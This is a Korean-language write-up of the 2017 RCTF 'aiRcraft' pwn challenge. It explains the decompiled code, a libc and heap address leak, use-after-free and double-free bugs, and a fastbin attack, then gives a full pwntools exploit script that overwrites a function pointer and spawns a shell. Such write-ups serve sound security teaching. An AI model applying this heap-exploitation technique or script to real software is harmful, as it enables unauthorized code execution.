# 2017 RCTF - [PWN] aiRcraft

## Key words

- amd64 | NX | PIE | Partial Relro
- Heap Exploit
- double-free
- use-after-free
- overwritten function ptr

## Solution

먼저, 문제 메뉴에 대해 살펴 보도록 하겠습니다. 메인 메뉴에 대해서는 다음과 같습니다.

```c
  puts("Welcome to aiRline!");
  while ( 1 )
  {
    puts("what do you want to do?");
    puts("1. Buy a new plane");
    puts("2. Build a new airport");
    puts("3. Enter a airport");
    puts("4. Select a plane");
    puts("5. Exit");
    printf("Your choice: ");
    v0 = fn_getN_B20();
    if ( v0 <= 5 )
      break;
    puts("Invaild choice!");
  }
```

`buy`, `build` 메뉴를 통해 `plane`과 `airport`를 설정할 수 있습니다.

먼저, `Buy a plane` 쪽 메뉴를 살펴 보도록 하겠습니다.

```c
_QWORD *fn_buy_BED()
{
  _QWORD *result; // rax@7
  __int64 idx_company; // [sp+0h] [bp-10h]@0
  int v2; // [sp+4h] [bp-Ch]@4
  _QWORD *v_newObj; // [sp+8h] [bp-8h]@4

  puts("whcih company? ");
  LODWORD(idx_company) = 0;
  while ( (signed int)idx_company <= 3 )
  {
    printf("%d. %s\n", (unsigned int)(idx_company + 1), g_pStrCompany_202020[(signed int)idx_company], idx_company);
    LODWORD(idx_company) = idx_company + 1;
  }
  printf("Your choice: ", idx_company);
  v2 = fn_getN_B20();
  v_newObj = malloc(0x48uLL);
  if ( !v_newObj )
  {
    puts("malloc error!");
    exit(1);
  }
  v_newObj[4] = g_pStrCompany_202020[v2 - 1];
  printf("Input the plane's name: ");
  fn_vRead_AA0((__int64)v_newObj, 0x20u);
  *((_BYTE *)v_newObj + 31) = 0;
  v_newObj[5] = 0LL;
  fn_addCompany_B98((__int64)v_newObj);
  result = v_newObj;
  v_newObj[8] = sub_B7D;
  return result;
}
```

결론적으로, plane 구조는 다음과 같이 되어 있습니다.

```c
obj_plane = (plane *)malloc(0x48)

typedef struct t_plane {
  char plane_name[32]; # 0x20
  char *company_name;  # 0x8
  char *dock_name      # 0x8
  plane *prev;         # 0x8
  plane *next;         # 0x8
  (function *)(free);  # 0x8
}plane;
```

여기서 두 가지를 체크 하고 넘어 가야 합니다. 먼저, `Company` 선택 시, 입력 값의 범위를 체크 하지 않아 `code_base + 0x202020[n-1]` 기준으로 우리가 원하는 위치의 값을 `obj[4]`위치에 쓸 수가 있습니다. 이는 추후에 `AirPort`쪽 메뉴를 통해 `Plane`정보를 출력할 때, 회사명을 출력하는 부분이 있는데 이를 통해 메모리 노출이 가능합니다.

또한, free 함수 포인터가 plane 구조안에 있다는 것을 체크 합니다. 만약 임의 메모리 쓰기가 가능하고 해당 함수 포인터를 호출 할 수 있다면, 이 함수 포인터를 `one_shot` 가젯으로 덮어서 실행 흐름을 조작할 수 있기 때문입니다.

다음으로는 `Build a new airport` 구조를 보도록 하겠습니다.

```
obj_airport = malloc(0x88);
obj_airport[0] = malloc(n); # 15 < n <= 256 by user
```

airport 구조의 첫 8바이트가 사용자가 입력한 값 `(15 < n <= 256)`으로 할당하는 것을 체크해둡니다. 힙 문제에서 사용자가 입력한 크기로 할당되는 부분은 다음 힙이 할당되는 위치를 컨트롤 할 수 있는 중요한 역할을 합니다.

다음으로, `Enter a airport` 구조를 살펴 보면 다음과 같습니다.

```c
int fn_enter_130C()
{
  int result; // eax@4
  signed int v1; // [sp+Ch] [bp-4h]@1

  printf("Which airport do you want to choose? ");
  v1 = fn_getN_B20();
  if ( v1 >= 0 && v1 <= 15 && g_arrPort_202080[v1] )
    result = sub_11A5(g_arrPort_202080[v1]);
  else
    result = puts("No such airport!");
  return result;
}
```

사용자의 입력을 받고 해당 airport가 존재하면 sub_11A5로 분기 하게 됩니다. `g_arrPort_202080`은 현재 할당된 airport의 리스트가 존재하는 전역 변수의 위치 입니다.

sub_11A5를 살펴 보면 다음과 같습니다.

```c
int __fastcall sub_11A5(__int64 a1)
{
  int result; // eax@1

  while ( 1 )
  {
    puts("What do you want to do ?");
    puts("1. List all the plane");
    puts("2. Sell the airport");
    puts("3. Exit");
    printf("Your choice: ");
    result = fn_getN_B20();
    if ( result == 2 )
      return sub_F5E((_QWORD *)a1);
    if ( result == 3 )
      break;
    if ( result == 1 )
      fn_listPlane_D08((__int64 *)a1);
    else
      puts("Invaild choice!");
  }
  return result;
}
```

airport의 1번 메뉴를 살펴 보면 다음과 같습니다.

```c
int __fastcall fn_listPlane_D08(__int64 *a1)
{
  __int64 v1; // rax@2
  signed int i; // [sp+14h] [bp-Ch]@1
  __int64 *v4; // [sp+18h] [bp-8h]@2

  for ( i = 0; i <= 15; ++i )
  {
    v1 = a1[i + 1];
    v4 = (__int64 *)a1[i + 1];
    if ( v4 )
    {
      printf("Plane name: %s\n", v4);
      printf("Build by %s\n", v4[4]);
      LODWORD(v1) = printf("Docked at: %s\n", *(_QWORD *)v4[5]);
    }
  }
  return v1;
}
```

Airport에 등록된 Plane에 대한 정보를 출력 해줍니다. 먼저, 라이브러리 주소를 노출 시키는 시나리오는 다음과 같습니다.

1. Airport 를 여러개 생성 한뒤, 2개 이상 해제를 하여 힙 메모리에 `main_arena` 주소를 생성
2. Plane을 생성하고, Plane의 Comapny 인덱스를 크게 조작하여 방금 해제된 Airport의 위치로 지정
3. Plane을 해제가 안된 Airport에 등록하고 Plane 정보를 출력하게 되면 해제된 Airport의 `FD (main_arena)` 위치가 출력됨

```
pwndbg> x/20gx 0x555555756020
0x555555756020:	0x00005555555555d8	0x00005555555555df  ; Company Name 위치
0x555555756030:	0x00005555555555e6	0x00005555555555ef
0x555555756040:	0x00007ffff7dd2620	0x0000000000000000
0x555555756050:	0x00007ffff7dd18e0	0x0000000000000000
0x555555756060:	0x00007ffff7dd2540	0x0000000000000000
0x555555756070:	0x0000000000000000	0x0000000000000000
0x555555756080:	0x0000555555757010	0x0000555555757130  ; Airport List 위치
0x555555756090:	0x0000555555757250	0x0000000000000000

pwndbg> x/gx 0x0000555555757130
0x555555757130:	0x00007ffff7dd1bf8
```

Airport 3개를 생성하고 0, 1을 삭제 하게 되면 Airport[1] 위치 (=0x555555756088 -> 0x555555757130 -> heap area)에 `FD`와 `BK`가 남게 됩니다.

따라서, Plane 생성시, Company Name 인덱스를 14 `(0x202020[n-1])`로 하게 되면 Company Name의 주소가 `0x555555756088`이 되고, 이 Plane을 해제가 안된 Airport에 등록 시키고 Plane정보를 출력하게 되면 `main_arena`주소가 노출 됩니다.

이와 동일하게, 원래 Airport 는 힙 할당된 주소를 갖고 있기 때문에 인덱스 15 (해제가 안된 Airport)를 갖는 Plane을 생성한 뒤, 동일하게 노출하면 힙 주소도 얻을 수 있습니다.

```
pwndbg> x/20gx 0x555555756020
0x555555756020:	0x00005555555555d8	0x00005555555555df
0x555555756030:	0x00005555555555e6	0x00005555555555ef
0x555555756040 <stdout>:	0x00007ffff7dd2620	0x0000000000000000
0x555555756050 <stdin>:	0x00007ffff7dd18e0	0x0000000000000000
0x555555756060 <stderr>:	0x00007ffff7dd2540	0x0000000000000000
0x555555756070:	0x0000000000000000	0x0000000000000000
0x555555756080:	0x0000555555757010	0x0000555555757130
0x555555756090:	0x0000555555757250	0x0000000000000000

pwndbg> x/2gx 0x0000555555757250
0x555555757250:	0x00005555557572e0	0x0000555555757010

pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x555555554000     0x555555556000 r-xp     2000 0      /home/hackability/ctf/pwnable/0010_2017_RCTF_aiRcraft/aiRcraft
    0x555555755000     0x555555756000 r--p     1000 1000   /home/hackability/ctf/pwnable/0010_2017_RCTF_aiRcraft/aiRcraft
    0x555555756000     0x555555757000 rw-p     1000 2000   /home/hackability/ctf/pwnable/0010_2017_RCTF_aiRcraft/aiRcraft
    0x555555757000     0x555555778000 rw-p    21000 0      [heap]
    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0      
    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7fda000     0x7ffff7fdd000 rw-p     3000 0      
    0x7ffff7ff6000     0x7ffff7ff8000 rw-p     2000 0      
    0x7ffff7ff8000     0x7ffff7ffa000 r--p     2000 0      [vvar]
    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      
    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
```

필요한 정보는 모두 얻었으니 이제 본격적으로 실행 흐름을 바꾸기 위한 공격을 진행해보도록 합니다.

먼저, 버그가 생기는 부분은 Plane을 해제 할 때 생깁니다. AirPort구조는 해제 후 해당 포인터를 초기화 하여 `UAF`버그가 생기지 않지만, Plane은 해제 후, 초기화를 하지 않아 `UAF` 버그가 발생됩니다. 또한 AirPort 자체는 `UAF` 버그가 발생하진 않지만 AirPort 객체 해제 시 해당 AirPort에 연결된 Plane을 또 해제 하면서 `double-free` 버그가 발생됩니다.

지금 까지의 플로우를 설명하면 다음과 같습니다.

1. Airport A, B, C 생성
2. plane a, b 생성 후, Airport C에 연결
3. Airport A, B 삭제
4. plane a 삭제                 ; free list (a)
5. plane b 삭제                 ; free list (b -> a)
6. AirPort C 삭제
  - AirPort C 에 연결된 a 삭제    ; free list (a -> b > -> a)
  - AirPort C 에 연결된 b 삭제    ; free list (b -> a -> b -> a)

실제 동작하는 방식은 조금 다르지만 쉽게 설명하기 위해 위와 같이 넣었습니다. 1~6까지 동작을 진행하면 결국 `free list`에 (b -> a -> b -> a)의 형태로 들어 가게 되는데 이게 의미하는 것은 다음 할당이 `b -> a -> b -> a` 식으로 이루어 진다는 의미 입니다.

이렇게 되면 처음 `b`에 할당할 때, `FD`값을 강제로 넣은 뒤, 다음 할당은 `a`에 할당되고 다시 `b`에 할당될 때, 이번에 할당되는 b는 처음 b에서 할당했던 `FD`값을 다음 할당 할 주소로 넣게 되어 결국 다음 할당 시 처음 `b`를 할당하면서 강제로 넣은 `FD`의 위치로 할당이 되게 됩니다.

이를 이용하여 힙의 할당 위치를 조작할 수 있고, 힙 메모리에 존재하는 `plane` 오브젝트의 함수 포인터를 `one-shot`으로 덮어 쉘을 얻을 수 있습니다.

한 가지 중요한 것은 할당 시, `할당 위치 - 0x8`에 `(할당 할 크기 >> 4)+1 == (할당 위치 - 0x8) >> 4`와 같아야 합니다. plane 객체의 크기가 0x48이기 때문에 해제 리스트는 `0x50 bins` 에 구성이 되게 됩니다. 따라서, `__malloc_hook, __free_hook` 등과 `@got` 영역에 할당 시키기가 까다롭습니다.

따라서, 마지막 `b`를 할당 시, `0x50 bins`에 해당하는 값을 만들어서 그쪽으로 할당을 하고 함수 포인터를 매직 가젯으로 덮으면 됩니다.

## Exploit code

```python
from pwn import *
import sys

context(arch='amd64', os='linux')

DEBUG = False
if len(sys.argv) == 2:
	DEBUG = True

def fn_buy(idx, name):
	p.sendline("1")
	recv = p.recv()
	if DEBUG: print recv

	p.sendline(str(idx))
	recv = p.recv()
	if DEBUG: print recv

	# len(max_name) == 0x20
	p.sendline(name)
	recv = p.recv()
	if DEBUG: print recv

def fn_build(n, name):
	p.sendline("2")
	recv = p.recv()
	if DEBUG: print recv

	p.sendline(str(n))
	recv = p.recv()
	if DEBUG: print recv

	if len(name) == n:
		p.send(name)
	else:
		p.sendline(name)
	recv = p.recv()
	if DEBUG: print recv

def fn_enter_airport(idx, n_menu, ret=False):
	p.sendline("3")
	recv = p.recv()
	if DEBUG: print recv

	p.sendline(str(idx))
	recv = p.recv()
	if DEBUG: print recv

	# 1 : list all
	# 2 : sell the airport
	p.sendline(str(n_menu))
	data = p.recv().split("\x0a")
	if DEBUG: print data

	if n_menu == 1:
		p.sendline("3")

	if ret: return data

def fn_select_plane(name, n_menu, n_airport=0):
	p.sendline("4")
	recv = p.recv()
	if DEBUG: print recv

	p.sendline(name)
	recv = p.recv()
	if DEBUG: print recv

	p.sendline(str(n_menu))

	if n_menu == 1:
		recv = p.recv()
		if DEBUG: print recv

		p.sendline(str(n_airport))
		recv = p.recv()
		if DEBUG: print recv

		p.sendline("3")
		recv = p.recv()
		if DEBUG: print recv

def fn_leak(list_leak):
	for t in list_leak:
		print "*** {} : {} ***".format(hex(t["addr"]), t["title"])
		print hexdump(p.leak(t["addr"], t["size"]))

def fn_leak_one(addr, size, title=""):
	print "*** {} : {} ***".format(hex(addr), title)
	print hexdump(p.leak(addr, size))


target = "./aiRcraft"
code_base = 0x555555554000
heap_base = 0x555555757000
arrAirport = 0x202080
pHeadPlane = 0x202020
list_leak = [
	{
		"title": "heap_base",
		"addr" : heap_base,
		"size" : 0x280
	},{
		"title": "arrAirport",
		"addr" : code_base + arrAirport,
		"size" : 0x40
	},{
		"title": "pHeadPlane",
		"addr" : code_base + pHeadPlane,
		"size" : 0x40
	}
]
p = process(target)
recv = p.recv()
print recv

fn_build(0x80, "A"*8)
fn_build(0x80, "B"*8)
fn_build(0x80, "C"*8)

fn_enter_airport(0, 2)
fn_enter_airport(1, 2)

fn_buy(14, "a")
fn_select_plane("a", 1, 2)

libc_base = fn_enter_airport(2, 1, True)
libc_base = u64(libc_base[1].split("by ")[1].ljust(8, "\x00")) - 0x3c4bf8
one_shot = libc_base + 0x4526a
log.info("libc base : {}".format(hex(libc_base)))
log.info("one-shot  : {}".format(hex(one_shot)))

fn_buy(15, "b")
fn_select_plane("b", 1, 2)
addr_heap = fn_enter_airport(2, 1, True)
addr_heap = u64(addr_heap[4].split("by ")[1].ljust(8, "\x00"))
addr_heap = (addr_heap & 0xfffffffffffff000)
log.info("heap addr : {}".format(hex(addr_heap)))

fn_select_plane("a", 2) # UAF
fn_select_plane("b", 2) # UAF
fn_enter_airport(2, 2)  # double-freed

target_offset = 0x170
fn_buy(0, p64(addr_heap + target_offset - 0x38 + 0xe))
fn_buy(0, "E" * 8)
payload = "\x50" * 0x20
fn_buy(0, payload)

'''
0x559be21d4140:	0x5050505050505050	0x0050505050505050
0x559be21d4150:	0x4747000000000000	0x0000000000000000
0x559be21d4160:	0x0000559be21d4010	0x0000000000000000
0x559be21d4170:	0x0000559be18e5b7d	0x0000000000000041
0x559be21d4180:	0x00007f85e67b8b78	0x0000559be21d4240
'''
payload = "G" * 2
payload += p64(0)
payload += p64(addr_heap + 0x10)
payload += p64(0)
payload += p64(one_shot)
fn_build(0x40, payload)

fn_select_plane("\x50"*0x1f, 2)

p.interactive()
```

## Result

```
hackability@ubuntu:~/ctf/pwnable/0010_2017_RCTF_aiRcraft$ python sol_aiRcraft.py
[+] Starting local process './aiRcraft': pid 16916
Welcome to aiRline!
what do you want to do?
1. Buy a new plane
2. Build a new airport
3. Enter a airport
4. Select a plane
5. Exit
Your choice:
[*] libc base : 0x7ffff7a0d000
[*] one-shot  : 0x7ffff7a5226a
[*] heap addr : 0x555555757000
[*] Switching to interactive mode
$ id
uid=1000(hackability) gid=1000(hackability)
```
